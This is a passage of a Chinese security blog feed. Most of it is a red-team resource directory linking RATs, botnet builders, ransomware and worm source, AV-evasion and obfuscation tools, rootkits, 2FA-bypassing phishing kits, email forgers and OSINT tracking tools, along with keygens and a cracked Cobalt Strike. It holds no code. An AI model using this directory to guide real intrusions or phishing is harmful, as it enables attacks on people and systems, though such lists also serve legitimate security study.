一次性邮箱<br><br><a href="http://24mail.chacuo.net/">http://24mail.chacuo.net/</a> 一次性邮箱<br><br><a href="http://www.yopmail.com/">http://www.yopmail.com</a> 一次性邮箱<br><br><a href="https://yandex.com/">https://yandex.com/</a> 非手机邮箱<br><br><a href="https://mail.ru/">https://mail.ru/</a> 非手机邮箱<br><br><a href="https://mail.protonmail.com/login">https://mail.protonmail.com/login</a> 非手机邮箱<br><br><a href="https://github.com/walkor/workerman-chat">https://github.com/walkor/workerman-chat</a> php，在线聊天室，可扩展<br><br><a href="https://github.com/hack-chat">https://github.com/hack-chat</a> <br><a href="https://hack.chat/?your-channel">https://hack.chat/?your-channel</a> js,在线聊天，问号后面跟你的房间名<br><br><a href="https://github.com/akaxincom/openzaly">https://github.com/akaxincom/openzaly</a> java,聊天室，Akaxin为客户端闭源<br><br><a href="https://github.com/RocketChat/Rocket.Chat">https://github.com/RocketChat/Rocket.Chat</a> js,在线团队聊天服务器，<br><a href="https://rocket.chat/install">https://rocket.chat/install</a><br><br><a href="https://telegram.org/">https://telegram.org</a><br><br><a href="https://www.whatsapp.com/">https://www.whatsapp.com</a><br><br><a href="https://wire.com/en">https://wire.com/en</a><br><br><a href="https://signal.org/">https://signal.org</a><br><br><a href="http://www.batmessenger.com/">http://www.batmessenger.com</a><br><br><a href="http://sid.co/">http://sid.co</a></p></blockquote><h2 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源"></a><strong>在线资源</strong></h2><blockquote><p><a href="https://github.com/DoubleLabyrinth/navicat-keygen">https://github.com/DoubleLabyrinth/navicat-keygen</a> navicat注册机<br><br><a href="https://github.com/DoubleLabyrinth/MobaXterm-keygen">https://github.com/DoubleLabyrinth/MobaXterm-keygen</a> MobaXterm注册机<br><br><a href="http://www.zdfans.com/">http://www.zdfans.com</a> zd423 - 软件分享平台领跑者<br><br><a href="https://www.flaticon.com/">https://www.flaticon.com</a> 免费图标网站<br><br><a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn</a> 原生镜像<br><br><a href="https://www.freenom.com/">https://www.freenom.com</a> 注册免费域名，dns解析<br><br><a href="https://codebeautify.org/">https://codebeautify.org</a> 在线代码美化<br><br><a href="http://patorjk.com/">http://patorjk.com</a> Text to ASCII Art Generator<br><br><a href="https://www.seopojie.com/">https://www.seopojie.com</a> SPAM,SEO</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TOOLS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>红蓝资料集锦</title>
      <link href="2020/10/09/hong-lan-zi-liao-ji-jin/"/>
      <url>2020/10/09/hong-lan-zi-liao-ji-jin/</url>
      
        <content type="html"><![CDATA[<h1 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h1><p>一个 Red Team 攻击的生命周期，整个生命周期包括：</p><p>信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、在所有攻击结束之后清理并退出战场。<br>和一个著名的蓝队项目：<a href="https://github.com/meitar/awesome-cybersecurity-blueteam">https://github.com/meitar/awesome-cybersecurity-blueteam</a></p><hr><blockquote><p><a href="http://www.lshack.cn/774/">另一个专门扫描破解的项目</a></p></blockquote><hr><h2 id="相关资源列表"><a href="#相关资源列表" class="headerlink" title="相关资源列表"></a><strong>相关资源列表</strong></h2><blockquote><p><a href="https://mitre-attack.github.io/">https://mitre-attack.github.io/</a> mitre科技机构对攻击技术的总结wiki<br><br><a href="https://huntingday.github.io/">https://huntingday.github.io</a> MITRE | ATT&amp;CK 中文站<br><br><a href="https://arxiv.org/">https://arxiv.org</a> 康奈尔大学（Cornell University）开放文档<br><br><a href="http://www.owasp.org.cn/owasp-project/owasp-things">http://www.owasp.org.cn/owasp-project/owasp-things</a> OWASP项目<br><br><a href="http://www.irongeek.com/i.php?page=security/hackingillustrated">http://www.irongeek.com/i.php?page=security/hackingillustrated</a> 国内外安全大会相关视频与文档<br><br><a href="https://github.com/knownsec/KCon">https://github.com/knownsec/KCon</a> KCon大会文章PPT<br><br><a href="https://github.com/SecWiki/sec-chart">https://github.com/SecWiki/sec-chart</a> 各种相关安全思维导图集合<br><br><a href="https://github.com/knownsec/RD_Checklist">https://github.com/knownsec/RD_Checklist</a> 知道创宇技能列表<br><br><a href="https://github.com/ChrisLinn/greyhame-2017">https://github.com/ChrisLinn/greyhame-2017</a> 灰袍技能书2017版本<br><br><a href="https://github.com/Hack-with-Github/Awesome-Hacking">https://github.com/Hack-with-Github/Awesome-Hacking</a> GitHub万星推荐：黑客成长技术清单<br><br><a href="https://github.com/k4m4/movies-for-hackers">https://github.com/k4m4/movies-for-hackers</a> 安全相关电影<br><br><a href="https://github.com/jaredthecoder/awesome-vehicle-security">https://github.com/jaredthecoder/awesome-vehicle-security</a> 一个用于了解车辆安全和汽车黑客的资源清单<br><br><a href="https://www.jianshu.com/p/852e0fbe2f4c">https://www.jianshu.com/p/852e0fbe2f4c</a> 安全产品厂商分类<br><br><a href="https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/">https://www.reddit.com/r/Python/comments/a81mg3/the_entire_mit_intro_computer_science_class_using/</a> 麻省理工机器学习视频<br><br><a href="https://github.com/fxsjy/jieba">https://github.com/fxsjy/jieba</a> py，结巴中文分词<br><br><a href="https://github.com/thunlp/THULAC-Python">https://github.com/thunlp/THULAC-Python</a> py，清华中文分词<br><br><a href="https://github.com/lancopku/PKUSeg-python">https://github.com/lancopku/PKUSeg-python</a> py3，北大中文分词<br><br><a href="https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes">https://github.com/fengdu78/Coursera-ML-AndrewNg-Notes</a> 吴恩达机器学习python笔记<br><br><a href="https://paperswithcode.com/sota">https://paperswithcode.com/sota</a> 机器学习具体项目、演示、代码<br><br><a href="https://github.com/duoergun0729/nlp">https://github.com/duoergun0729/nlp</a> 一本开源的NLP（神经语言程序学）入门书籍<br><br><a href="https://www.freebuf.com/articles/web/195304.html">https://www.freebuf.com/articles/web/195304.html</a> 一句话木马的套路</p></blockquote><h2 id="攻防测试手册"><a href="#攻防测试手册" class="headerlink" title="攻防测试手册"></a><strong>攻防测试手册</strong></h2><blockquote><p><a href="https://micropoor.blogspot.com/2019/01/php8.html">https://micropoor.blogspot.com/2019/01/php8.html</a> PHP安全新闻早8点课程系列高持续渗透–Microporor<br><br><a href="https://github.com/Micropoor/Micro8">https://github.com/Micropoor/Micro8</a> Microporor高级攻防100课<br><br><a href="https://github.com/maskhed/Papers">https://github.com/maskhed/Papers</a> 包含100课等经典攻防教材、安全知识<br><br><a href="https://github.com/infosecn1nja/AD-Attack-Defense">https://github.com/infosecn1nja/AD-Attack-Defense</a> 红蓝方攻防手册<br><br><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a> 优秀红队资源列表<br><br><a href="https://github.com/foobarto/redteam-notebook">https://github.com/foobarto/redteam-notebook</a> 红队标准渗透测试流程+常用命令<br><br><a href="https://github.com/tom0li/collection-document">https://github.com/tom0li/collection-document</a> 文章收集：安全部、SDL、src、渗透测试、漏洞利用<br><br><a href="https://github.com/kbandla/APTnotes">https://github.com/kbandla/APTnotes</a> 各种公开的文件和相关的APT笔记，还有软件样本<br><br><a href="https://wizardforcel.gitbooks.io/web-hacking-101/content">https://wizardforcel.gitbooks.io/web-hacking-101/content</a> Web Hacking 101 中文版<br><br><a href="https://techvomit.net/web-application-penetration-testing-notes/">https://techvomit.net/web-application-penetration-testing-notes/</a> web渗透测试笔记<br><br><a href="https://github.com/qazbnm456/awesome-web-security">https://github.com/qazbnm456/awesome-web-security</a> Web安全资料和资源列表<br><br><a href="http://pentestmonkey.net/category/cheat-sheet">http://pentestmonkey.net/category/cheat-sheet</a> 渗透测试常见条目<br><br><a href="https://github.com/demonsec666/Security-Toolkit">https://github.com/demonsec666/Security-Toolkit</a> 渗透攻击链中常用工具及使用场景<br><br><a href="https://github.com/Kinimiwar/Penetration-Testing">https://github.com/Kinimiwar/Penetration-Testing</a> 渗透测试方向优秀资源收集<br><br><a href="https://github.com/jshaw87/Cheatsheets">https://github.com/jshaw87/Cheatsheets</a> 渗透测试/安全秘籍/笔记</p></blockquote><h2 id="内网安全文档"><a href="#内网安全文档" class="headerlink" title="内网安全文档"></a><strong>内网安全文档</strong></h2><blockquote><p><a href="https://attack.mitre.org/wiki/Lateral_Movement">https://attack.mitre.org/wiki/Lateral_Movement</a> mitre机构对横向移动的总结<br><br><a href="https://payloads.online/archivers/2018-11-30/1">https://payloads.online/archivers/2018-11-30/1</a> 彻底理解Windows认证 - 议题解读<br><br><a href="https://github.com/klionsec/klionsec.github.io">https://github.com/klionsec/klionsec.github.io</a> 内网大牛的学习历程<br><br><a href="https://github.com/l3m0n/pentest_study">https://github.com/l3m0n/pentest_study</a> 从零开始内网渗透学习<br><br><a href="https://github.com/Ridter/Intranet_Penetration_Tips">https://github.com/Ridter/Intranet_Penetration_Tips</a> 内网渗透TIPS</p></blockquote><h2 id="内网拓展后渗透"><a href="#内网拓展后渗透" class="headerlink" title="内网拓展后渗透"></a><strong>内网拓展后渗透</strong></h2><blockquote><p><a href="https://github.com/OpenWireSec/metasploit">https://github.com/OpenWireSec/metasploit</a> 后渗透框架<br><br><a href="https://github.com/EmpireProject/Empire">https://github.com/EmpireProject/Empire</a> 基于poweshell的命令执行框架<br><br><a href="https://github.com/TheSecondSun/Bashark">https://github.com/TheSecondSun/Bashark</a> 纯Bash脚本编写的后渗透框架，大鲨鱼<br><br><a href="https://github.com/JusticeRage/FFM">https://github.com/JusticeRage/FFM</a> py3，拥有下载、上传功能，生成可执行py脚本的后门的后渗透框架<br><br><a href="https://github.com/DarkSpiritz/DarkSpiritz">https://github.com/DarkSpiritz/DarkSpiritz</a> py2,后渗透框架<br><br><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a> 网络测试中的瑞士军刀，包含impacket、PowerSploit等多种模块<br><br><a href="https://github.com/SpiderLabs/scavenger">https://github.com/SpiderLabs/scavenger</a> 对CrackMapExec进行二次包装开发进行内网敏感信息扫描<br><br><a href="https://github.com/jmortega/python-pentesting">https://github.com/jmortega/python-pentesting</a> python-pentesting-tool python安全工具相关功能模块<br><br><a href="https://github.com/0xdea/tactical-exploitation">https://github.com/0xdea/tactical-exploitation</a> Python/PowerShell的测试脚本集<br><br><a href="https://github.com/PowerShellMafia/PowerSploit">https://github.com/PowerShellMafia/PowerSploit</a> powershell测试脚本集与开发框架汇总<br><br><a href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a> powershell脚本集与利用框架<br><br><a href="https://github.com/PowerShellEmpire/PowerTools">https://github.com/PowerShellEmpire/PowerTools</a> PowerShell脚本集，停止更新<br><br><a href="https://github.com/FuzzySecurity/PowerShell-Suite">https://github.com/FuzzySecurity/PowerShell-Suite</a> PowerShell脚本集<br><br><a href="https://github.com/rvrsh3ll/Misc-Powershell-Scripts">https://github.com/rvrsh3ll/Misc-Powershell-Scripts</a> PowerShell脚本集<br><br><a href="https://github.com/nccgroup/redsnarf">https://github.com/nccgroup/redsnarf</a> 窃取哈希，密码解密，偷偷调用猕猴桃等程序，rdp多方法利用，远程启动shell，清楚痕迹<br><br><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a> 用于分析域成员和用用户关系的程序，通过用powershell脚本导出域内的session、computer、group、user等信息，入库后进行可视化分析可以做到定点攻击。<br><br><a href="https://github.com/xorrior/RemoteRecon">https://github.com/xorrior/RemoteRecon</a> 利用DotNetToJScript进行截图、key记录、token窃取、dll与恶意代码注入<br><br><a href="https://github.com/SkyLined/LocalNetworkScanner">https://github.com/SkyLined/LocalNetworkScanner</a> 利用浏览器漏洞当对方打开网址时，扫描对方内网信息<br><br><a href="https://github.com/fdiskyou/hunter">https://github.com/fdiskyou/hunter</a> 调用 Windows API 对内网信息进行搜集很全面<br><br><a href="https://github.com/0xwindows/VulScritp">https://github.com/0xwindows/VulScritp</a> 内网渗透脚本，包括banner扫描、端口扫描；phpmyadmin、jenkins等通用漏洞利用等<br><br><a href="https://github.com/lcatro/network_backdoor_scanner">https://github.com/lcatro/network_backdoor_scanner</a> 基于网络流量的内网探测框架<br><br><a href="https://github.com/sowish/LNScan">https://github.com/sowish/LNScan</a> 详细的内部网络信息扫描器<br><br><a href="https://github.com/rootlabs/nWatch">https://github.com/rootlabs/nWatch</a> 联动nmap，并对组织内网进行扫描<br><br><a href="https://github.com/m8r0wn/nullinux">https://github.com/m8r0wn/nullinux</a> 用于Linux的内部渗透测试工具，可用于通过SMB枚举操作系统信息，域信息，共享，目录和用户。<br><br><a href="https://github.com/zMarch/Orc">https://github.com/zMarch/Orc</a> bash，Linux下后渗透命令集合</p></blockquote><h2 id="远控"><a href="#远控" class="headerlink" title="远控"></a><strong>远控</strong></h2><blockquote><p><a href="https://github.com/malwaredllc/byob">https://github.com/malwaredllc/byob</a> 僵尸网络生成框架<br><br><a href="https://github.com/proxycannon/proxycannon-ng">https://github.com/proxycannon/proxycannon-ng</a> 构建攻击僵尸网络<br><br><a href="https://github.com/deadPix3l/CryptSky/">https://github.com/deadPix3l/CryptSky/</a> 勒索软件poc<br><br><a href="https://github.com/jgamblin/Mirai-Source-Code">https://github.com/jgamblin/Mirai-Source-Code</a> 蠕虫病毒poc<br><br><a href="https://github.com/AhMyth/AhMyth-Android-RAT">https://github.com/AhMyth/AhMyth-Android-RAT</a> 基于smali，Windows下安卓远控，一对多带界面<br><br><a href="https://github.com/ssooking/cobaltstrike3.12_cracked">https://github.com/ssooking/cobaltstrike3.12_cracked</a> java1.8，远控、钓鱼、内网<br><br><a href="https://github.com/Mr-Un1k0d3r/ThunderShell">https://github.com/Mr-Un1k0d3r/ThunderShell</a> py2，CLI与web端，内存马，RC4加密HTTP传输<br><br><a href="https://github.com/tiagorlampert/CHAOS">https://github.com/tiagorlampert/CHAOS</a> go，win远控，可过大部分杀软<br><br><a href="https://github.com/Ne0nd0g/merlin">https://github.com/Ne0nd0g/merlin</a> go，c2通讯，一对多<br><br><a href="https://github.com/0x09AL/Browser-C2">https://github.com/0x09AL/Browser-C2</a> go，利用chrome以浏览器的形式连接C2服务器<br><br><a href="https://github.com/xdnice/PCShare">https://github.com/xdnice/PCShare</a> c++，可以监视目标机器屏幕、注册表、文件系统等<br><br><a href="https://github.com/quasar/QuasarRAT">https://github.com/quasar/QuasarRAT</a> c#，一对多，界面<br><br><a href="https://github.com/TheM4hd1/Vayne-RaT">https://github.com/TheM4hd1/Vayne-RaT</a> c#，一对多，界面<br><br><a href="https://github.com/nettitude/PoshC2">https://github.com/nettitude/PoshC2</a> PowerShell、C#，远控工具，有win提权组件<br><br><a href="https://github.com/euphrat1ca/njRAT-v0.7d">https://github.com/euphrat1ca/njRAT-v0.7d</a> vb，常见蠕虫远控，有很多变种，一对多带界面<br><br><a href="https://github.com/zerosum0x0/koadic">https://github.com/zerosum0x0/koadic</a> py3,利用JScript/VBScript 进行控制，大宝剑<br><br><a href="https://github.com/Ridter/MyJSRat">https://github.com/Ridter/MyJSRat</a> py2，利用js后门，配合chm、hta可实现很多后门方式。evi1cg.me/archives/chm_backdoor.html<br><br><a href="https://github.com/its-a-feature/Apfell">https://github.com/its-a-feature/Apfell</a> py3，macOS与linux下的利用js后门，web界面管理<br><br><a href="https://github.com/peterpt/fuzzbunch">https://github.com/peterpt/fuzzbunch</a> py2，NSA漏洞利用工具，配有自动化安装脚本与gui界面，远控rat<br><br><a href="https://github.com/n1nj4sec/pupy">https://github.com/n1nj4sec/pupy</a> py，Windows, Linux, OSX, Android跨平台，一对多<br><br><a href="https://github.com/nathanlopez/Stitch">https://github.com/nathanlopez/Stitch</a> py，Windows、Mac OSX、Linux跨平台<br><br><a href="https://github.com/neoneggplant/EggShell">https://github.com/neoneggplant/EggShell</a> py，macos/osx远控,可生成HID代码，一对多<br><br><a href="https://github.com/Marten4n6/EvilOSX">https://github.com/Marten4n6/EvilOSX</a> py，macos/osx远控，一对多<br><br><a href="https://github.com/vesche/basicRAT">https://github.com/vesche/basicRAT</a> py3，simple远控，一对多<br><br><a href="https://github.com/Viralmaniar/Powershell-RAT">https://github.com/Viralmaniar/Powershell-RAT</a> py，截图通过gmail传输<br><br><a href="https://github.com/byt3bl33d3r/gcat">https://github.com/byt3bl33d3r/gcat</a> py，使用 gmail 作为 C&amp;C 服务器<br><br><a href="https://github.com/sweetsoftware/Ares">https://github.com/sweetsoftware/Ares</a> py，c2通讯，支持代理<br><br><a href="https://github.com/micle-fm/Parat">https://github.com/micle-fm/Parat</a> py，利用telegram，windows下的远程控制工具<br><br><a href="https://github.com/ahhh/Reverse_DNS_Shell">https://github.com/ahhh/Reverse_DNS_Shell</a> py，通过dns传输<br><br><a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a> 服务端为ruby（linux），客户端为C（win/linux），利用DNS协议进行端对端传输<br><br><a href="https://github.com/deepzec/Grok-backdoor">https://github.com/deepzec/Grok-backdoor</a> py，利用ngrok的后门<br><br><a href="https://github.com/trustedsec/trevorc2">https://github.com/trustedsec/trevorc2</a> py，搭建一个合法的网站（可浏览），用于隐藏命令执行的客户端/服务器通信</p></blockquote><h2 id="后门免杀代码混淆"><a href="#后门免杀代码混淆" class="headerlink" title="后门免杀代码混淆"></a><strong>后门免杀代码混淆</strong></h2><blockquote><p><a href="https://www.shellterproject.com/">https://www.shellterproject.com</a> 杀毒软件绕过<br><br><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a> py，一键生成多种后门<br><br><a href="https://github.com/islamTaha12/Python-Rootkit">https://github.com/islamTaha12/Python-Rootkit</a> windows下rootkit，反弹meterpreter<br><br><a href="https://github.com/n00py/Hwacha">https://github.com/n00py/Hwacha</a> linux下快速生成metepreter等多种payload<br><br><a href="https://github.com/Screetsec/Vegile">https://github.com/Screetsec/Vegile</a> msf免杀，程序注入<br><br><a href="https://github.com/MohamedNourTN/Terminator">https://github.com/MohamedNourTN/Terminator</a> py2，msf免杀<br><br><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a> msf免杀<br><br><a href="https://github.com/abedalqaderswedan1/aswcrypter">https://github.com/abedalqaderswedan1/aswcrypter</a> py、bash，msf免杀<br><br><a href="https://github.com/Screetsec/TheFatRat">https://github.com/Screetsec/TheFatRat</a> java，msf免杀，利用searchsploit快速搜索<br><br><a href="https://github.com/pasahitz/zirikatu">https://github.com/pasahitz/zirikatu</a> msf免杀<br><br><a href="https://github.com/govolution/avet">https://github.com/govolution/avet</a> msf免杀<br><br><a href="https://github.com/GreatSCT/GreatSCT">https://github.com/GreatSCT/GreatSCT</a> msf免杀<br><br><a href="https://github.com/EgeBalci/HERCULES">https://github.com/EgeBalci/HERCULES</a> msf免杀<br><br><a href="https://github.com/trustedsec/nps_payload">https://github.com/trustedsec/nps_payload</a> msf免杀<br><br><a href="https://github.com/4w4k3/Insanity-Framework">https://github.com/4w4k3/Insanity-Framework</a> py，payload生成，过杀软，识别虚拟机，钓鱼，内存注入等<br><br><a href="https://github.com/hlldz/SpookFlare">https://github.com/hlldz/SpookFlare</a> Meterpreter，Empire，Koadic等loader/dropper的生成器，可以绕过客户端检测和网络端检测的端点策略<br><br><a href="https://github.com/pasahitz/regsvr32">https://github.com/pasahitz/regsvr32</a> 使用C#+Empire实现最小体积免杀后门<br><br><a href="https://github.com/malcomvetter/UnstoppableService">https://github.com/malcomvetter/UnstoppableService</a> 将自身安装为Windows服务且管理员无法停止/暂停服务的程序. C#编写<br><br><a href="https://github.com/Cn33liz/StarFighters">https://github.com/Cn33liz/StarFighters</a> 基于DotNetToJScript，利用JavaScript和VBScript执行Empire Launcher<br><br><a href="https://github.com/mdsecactivebreach/SharpShooter">https://github.com/mdsecactivebreach/SharpShooter</a> 基于DotNetToJScript使用js、vbs，用于检索和执行任意CSharp源码的payload创建框架<br><br><a href="https://github.com/mdsecactivebreach/CACTUSTORCH">https://github.com/mdsecactivebreach/CACTUSTORCH</a> 基于DotNetToJScript使用js、vbs生成恶意payload<br><br><a href="https://github.com/OmerYa/Invisi-Shell">https://github.com/OmerYa/Invisi-Shell</a> 对powershell文件进行混淆<br><br><a href="https://github.com/danielbohannon/Invoke-DOSfuscation">https://github.com/danielbohannon/Invoke-DOSfuscation</a> 对powershell文件进行混淆，加密操作以及重新编码<br><br><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a> 对powershell文件进行混淆，加密操作以及重新编码<br><br><a href="https://github.com/Mr-Un1k0d3r/SCT-obfuscator">https://github.com/Mr-Un1k0d3r/SCT-obfuscator</a> Cobalt Strike SCT有效载荷混淆器<br><br><a href="https://github.com/tokyoneon/Armor">https://github.com/tokyoneon/Armor</a> bash，生成加密 Payload 在 macOS 上反弹 Shell<br><br><a href="https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator">https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator</a> 宏混淆，其中还包括AV/Sandboxes逃避机制<br><br><a href="https://github.com/Kkevsterrr/backdoorme">https://github.com/Kkevsterrr/backdoorme</a> py3、py2多种类型的后门、shell生成工具，可以自动维持权限<br><br><a href="https://github.com/TestingPens/MalwarePersistenceScripts">https://github.com/TestingPens/MalwarePersistenceScripts</a> win下权限维持脚本<br><br><a href="https://github.com/mhaskar/Linux-Root-Kit">https://github.com/mhaskar/Linux-Root-Kit</a> py，simple，linux下rootkit<br><br><a href="https://github.com/PinkP4nther/Sutekh">https://github.com/PinkP4nther/Sutekh</a> simple，rootkit，使普通用户获取root shell<br><br><a href="https://github.com/threatexpress/metatwin">https://github.com/threatexpress/metatwin</a> 从一个文件中提取元数据，包括数字签名，并注入到另一个文件中<br><br><a href="https://github.com/Mr-Un1k0d3r/Windows-SignedBinary">https://github.com/Mr-Un1k0d3r/Windows-SignedBinary</a> 可以修改二进制文件的HASH，同时保留微软windows的签名<br><br><a href="https://github.com/secretsquirrel/SigThief">https://github.com/secretsquirrel/SigThief</a> py，用于劫持合法的数字签名并绕过Windows的哈希验证机制的脚本工具<br><br><a href="https://github.com/9aylas/Shortcut-Payload-Generator">https://github.com/9aylas/Shortcut-Payload-Generator</a> 快捷方式(.lnk)文件Payload生成器.AutoIt编写<br><br><a href="https://github.com/GuestGuri/Rootkit">https://github.com/GuestGuri/Rootkit</a> 反弹一个tcp连接，将进程id绑定到一个空文件夹<br><br><a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a> 可以生成win32PE后门测试程序,ELF文件后门程序等</p></blockquote><h2 id="社会工程"><a href="#社会工程" class="headerlink" title="社会工程"></a><strong>社会工程</strong></h2><blockquote><p><a href="https://github.com/brannondorsey/PassGAN">https://github.com/brannondorsey/PassGAN</a> py,深度学习,密码字典样本生成<br><br><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a> 根据用户习惯密码生成弱口令探测<br><br><a href="https://github.com/Saferman/cupper">https://github.com/Saferman/cupper</a> 根据用户习惯密码生成弱口令探测，楼上升级<br><br><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a> py3，特定密码字典生成<br><br><a href="https://github.com/mehulj94/Radium-Keylogger">https://github.com/mehulj94/Radium-Keylogger</a> python下的键盘记录工具<br><br><a href="https://github.com/threatexpress/domainhunter">https://github.com/threatexpress/domainhunter</a> 检查过期域名，bluecoat分类和Archive.org历史记录，以确定最为适合于钓鱼和C2的域名<br><br><a href="https://github.com/Mr-Un1k0d3r/CatMyPhish">https://github.com/Mr-Un1k0d3r/CatMyPhish</a> 收集目标类似的尚未注册的域名<br><br><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a> Bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息<br><br><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a> Sreg可对使用者通过输入email、phone、username的返回用户注册的所有互联网护照信息。<br><br><a href="https://github.com/SpiderLabs/social_mapper">https://github.com/SpiderLabs/social_mapper</a> 社交媒体枚举和关联工具, 通过人脸识别关联人物侧写<br><br><a href="https://github.com/vysec/MaiInt">https://github.com/vysec/MaiInt</a> 公司雇员信息收集测试工具<br><br><a href="https://github.com/jofpin/trape">https://github.com/jofpin/trape</a> py，利用OSINT对人员进行追踪定位<br><br><a href="https://github.com/famavott/osint-scraper">https://github.com/famavott/osint-scraper</a> 输入人名或邮箱地址, 自动从互联网爬取关于此人的信息<br><br><a href="https://github.com/xHak9x/fbi">https://github.com/xHak9x/fbi</a> py2,facebook脸书信息搜集工具<br><br><a href="https://github.com/initstring/linkedin2username">https://github.com/initstring/linkedin2username</a> 通过Linkedin 领英获取相关公司员工列表<br><br><a href="https://github.com/0x09AL/raven">https://github.com/0x09AL/raven</a> linux下领英Linkedin information gathering tool<br><br><a href="https://github.com/Ridter/Mailget">https://github.com/Ridter/Mailget</a> 通过脉脉用户猜测企业邮箱<br><br><a href="https://github.com/haccer/tweep">https://github.com/haccer/tweep</a> 使用twitter API进行信息爬取查询<br><br><a href="https://github.com/MazenElzanaty/TwLocation">https://github.com/MazenElzanaty/TwLocation</a> py，获取Twitter用户发推的地址<br><br><a href="https://github.com/vaguileradiaz/tinfoleak">https://github.com/vaguileradiaz/tinfoleak</a> web界面，对某人的twitter进行全面的情报分析<br><br><a href="https://github.com/deepfakes">https://github.com/deepfakes</a> 虚假音视频制作<br><br><a href="https://www.jianshu.com/p/147cf5414851">https://www.jianshu.com/p/147cf5414851</a> 聊聊那些常见的探侦类APP<br><br><a href="https://github.com/thinkst/canarytokens">https://github.com/thinkst/canarytokens</a> 重要文件的追踪溯源，信标定位（<br><a href="https://canarytokens.org/generate#%EF%BC%89">https://canarytokens.org/generate#）</a><br><br><a href="https://github.com/ggerganov/kbd-audio">https://github.com/ggerganov/kbd-audio</a> c++,linux,利用麦克风监控键盘输入测试输入值</p></blockquote><h2 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a><strong>钓鱼邮件</strong></h2><blockquote><p><a href="https://github.com/bhdresh/SocialEngineeringPayloads">https://github.com/bhdresh/SocialEngineeringPayloads</a> 负责收集用于证书盗窃和鱼叉式网络钓鱼攻击的社交工程技巧和payloads<br><br><a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a> 专为社交工程设计的开源渗透测试框架<br><br><a href="https://github.com/thelinuxchoice/blackeye">https://github.com/thelinuxchoice/blackeye</a> 拥有facebook、instagram等三十余个钓鱼模板的一键启用工具<br><br><a href="https://github.com/M4cs/BlackEye-Python">https://github.com/M4cs/BlackEye-Python</a> 以blackeye为基础加强子域的管理<br><br><a href="https://github.com/azizaltuntas/Camelishing">https://github.com/azizaltuntas/Camelishing</a> py3，界面化社会工程学攻击辅助工具<br><br><a href="https://github.com/JonCooperWorks/judas">https://github.com/JonCooperWorks/judas</a> go，克隆网站钓鱼<br><br><a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a> go，拥有在线模板设计、发送诱骗广告等功能的钓鱼系统<br><br><a href="https://github.com/tatanus/SPF">https://github.com/tatanus/SPF</a> py2，deefcon上的钓鱼系统<br><br><a href="https://github.com/MSG-maniac/mail_fishing">https://github.com/MSG-maniac/mail_fishing</a> 甲方内部钓鱼系统<br><br><a href="https://github.com/samyoyo/weeman">https://github.com/samyoyo/weeman</a> 钓鱼的<br>http服务器<br><br><a href="https://github.com/Raikia/FiercePhish">https://github.com/Raikia/FiercePhish</a> 可以管理所有钓鱼攻击的完整钓鱼框架，允许你跟踪单独的网络钓鱼活动，定时发送电子邮件等<br><br><a href="https://github.com/securestate/king-phisher">https://github.com/securestate/king-phisher</a> 可视化钓鱼活动工具包<br><br><a href="https://github.com/fireeye/ReelPhish">https://github.com/fireeye/ReelPhish</a> 实时双因素网络钓鱼工具<br><br><a href="https://github.com/kgretzky/evilginx">https://github.com/kgretzky/evilginx</a> 绕过双因素验证的钓鱼框架<br><br><a href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a> MiTM 框架, 登录页面钓鱼, 绕过双因素认证等<br><br><a href="https://github.com/ustayready/CredSniper">https://github.com/ustayready/CredSniper</a> 使用Flask和Jinja2模板编写的网络钓鱼框架，支持捕获2FA令牌<br><br><a href="https://github.com/fireeye/PwnAuth">https://github.com/fireeye/PwnAuth</a> OAuth滥用测试检测平台<br><br><a href="https://github.com/n0pe-sled/Postfix-Server-Setup">https://github.com/n0pe-sled/Postfix-Server-Setup</a> 自动化建立一个网络钓鱼服务器<br><br><a href="https://github.com/Dionach/PhEmail">https://github.com/Dionach/PhEmail</a> py2，钓鱼与邮件伪造<br><br><a href="https://github.com/PHPMailer/PHPMailer">https://github.com/PHPMailer/PHPMailer</a> 世界上最流行的PHP发送邮件的代码<br><br><a href="http://tool.chacuo.net/mailanonymous">http://tool.chacuo.net/mailanonymous</a> 在线邮件伪造<br><br><a href="http://ns4gov.000webhostapp.com/">http://ns4gov.000webhostapp.com</a> 在线邮件伪造</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红蓝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C2隐匿之域前置</title>
      <link href="2020/09/22/c2-yin-ni-zhi-yu-qian-zhi/"/>
      <url>2020/09/22/c2-yin-ni-zhi-yu-qian-zhi/</url>
      
